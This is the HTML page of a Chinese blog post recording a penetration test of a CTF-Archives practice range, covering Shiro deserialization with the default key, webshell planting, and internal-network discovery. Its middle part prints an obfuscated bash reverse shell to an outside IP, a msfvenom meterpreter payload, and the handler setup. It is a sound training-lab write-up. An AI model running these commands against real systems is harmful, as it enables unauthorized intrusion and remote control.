@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CTF-Archives项目里非常不错的一个靶场">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录某靶场渗透测试">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="CTF-Archives项目里非常不错的一个靶场">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726110222368.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726113327569.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726113010804.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728164920663.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726123511126.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728171605559.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726161923968.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728172739921.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728172814279.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728173404631.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726162432184.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726162610669.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726162922688.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240728181023781.png">
+<meta property="article:published_time" content="2024-07-26T02:54:45.000Z">
+<meta property="article:modified_time" content="2024-07-29T13:13:17.057Z">
+<meta property="article:author" content="rev1ve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240726110222368.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>记录某靶场渗透测试 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记录某靶场渗透测试
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-07-26 10:54:45" itemprop="dateCreated datePublished" datetime="2024-07-26T10:54:45+08:00">2024-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-29 21:13:17" itemprop="dateModified" datetime="2024-07-29T21:13:17+08:00">2024-07-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html" class="post-meta-item leancloud_visitors" data-flag-title="记录某靶场渗透测试" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CTF-Archives项目里非常不错的一个靶场</p>
+<span id="more"></span>
+
+<h1 id="记录某靶场渗透测试"><a href="#记录某靶场渗透测试" class="headerlink" title="记录某靶场渗透测试"></a>记录某靶场渗透测试</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>这里我是直接拿巨魔搭建的环境去打了，需要复现的请自行搭建</p>
+</blockquote>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p>
+<p>整体配置图如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726110222368.png" alt="image-20240726110222368"></p>
+<hr>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>fscan扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan.exe -h 139.9.4.56</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726113327569.png" alt="image-20240726113327569"></p>
+<p>扫出来8080端口存在shiro反序列化，密钥是默认密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>
+
+<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>我们访问一下8080端口，发现是登陆界面</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726113010804.png" alt="image-20240726113010804"></p>
+<p>打开shiro利用工具，修改为POST请求，添加上密钥看看</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728164920663.png" alt="image-20240728164920663"></p>
+<p>说明存在漏洞，并且爆出利用链</p>
+<p>当前为root权限</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726123511126.png" alt="image-20240726123511126"></p>
+<p>直接写入内存马，然后蚁剑选择jsp连接类型连接</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728171605559.png" alt="image-20240728171605559"></p>
+<p>当然也可以写个sh文件来弹shell（这里SummerSec写的工具echo命令有问题，我换成v2.2版本写的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># bash -i &gt;&amp; /dev/tcp/156.238.233.68/1028 0&gt;&amp;1</span><br><span class="line">echo &quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy42OC8xMDI4IDA+JjE=|base64 -d|bash&quot; &gt; /tmp/shell.sh</span><br><span class="line">chmod +x /tmp/shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接上后，在根目录下拿到第一个flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726161923968.png" alt="image-20240726161923968"></p>
+<h3 id="联动蚁剑上线metasploit"><a href="#联动蚁剑上线metasploit" class="headerlink" title="联动蚁剑上线metasploit"></a>联动蚁剑上线metasploit</h3><p>先用msfvenom生成linux的马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=156.238.233.68 LPORT=1028 -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728172739921.png" alt="image-20240728172739921"></p>
+<p>将生成的马上传到<code>/tmp</code>目录下，赋予elf文件可执行权限</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728172814279.png" alt="image-20240728172814279"></p>
+<p>然后开启msf监听器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 156.238.233.68</span><br><span class="line">set lport 1028</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>再执行elf文件成功上线metasploit</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728173404631.png" alt="image-20240728173404631"></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><blockquote>
+<p>因为蚁剑的shell权限比较高，所以直接在蚁剑进行信息收集</p>
+</blockquote>
+<h4 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h4><h5 id="查看网络配置信息"><a href="#查看网络配置信息" class="headerlink" title="查看网络配置信息"></a>查看网络配置信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>本机所处网段为<code>192.168.100.0/24</code></p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162432184.png" alt="image-20240726162432184"></p>
+<h5 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>尝试systeminfo发现不是windows系统，执行uname得到本机为Ubuntu系统</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162610669.png" alt="image-20240726162610669"></p>
+<h5 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162922688.png" alt="image-20240726162922688"></p>
+<h4 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><p>执行<code>background</code>回到msf6会话，基于ARP协议来发现内网存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">set RHOSTS 192.168.100.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>这里换其他协议都扫不出来，那只能上传fscan来扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.100.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728181023781.png" alt="image-20240728181023781"></p>
+<p>发现还存在ip为<code>192.168.100.2</code>的主机</p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>Ubuntu安装metasploit</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46717339/article/details/122653084">https://blog.csdn.net/qq_46717339/article/details/122653084</a></li>
+</ul>
+<p>metasploit探测内网存活主机</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/02/24/%E5%9F%BA%E4%BA%8EMSF%E7%9A%84%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B/">https://www.mi1k7ea.com/2021/02/24/%E5%9F%BA%E4%BA%8EMSF%E7%9A%84%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E4%BF%A1%E5%91%BCOA%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90.html" rel="prev" title="信呼OA后台getshell分析">
+      <i class="fa fa-chevron-left"></i> 信呼OA后台getshell分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html" rel="next" title="分析Express engine处理引擎的trick">
+      分析Express engine处理引擎的trick <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">1.</span> <span class="nav-text">记录某靶场渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">渗透过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">1.2.2.</span> <span class="nav-text">外网打点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%8A%A8%E8%9A%81%E5%89%91%E4%B8%8A%E7%BA%BFmetasploit"><span class="nav-number">1.2.3.</span> <span class="nav-text">联动蚁剑上线metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">本机基础信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.4.1.1.</span> <span class="nav-text">查看网络配置信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.4.1.2.</span> <span class="nav-text">查看操作系统信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.4.1.3.</span> <span class="nav-text">查看用户信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">探测内网存活主机</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
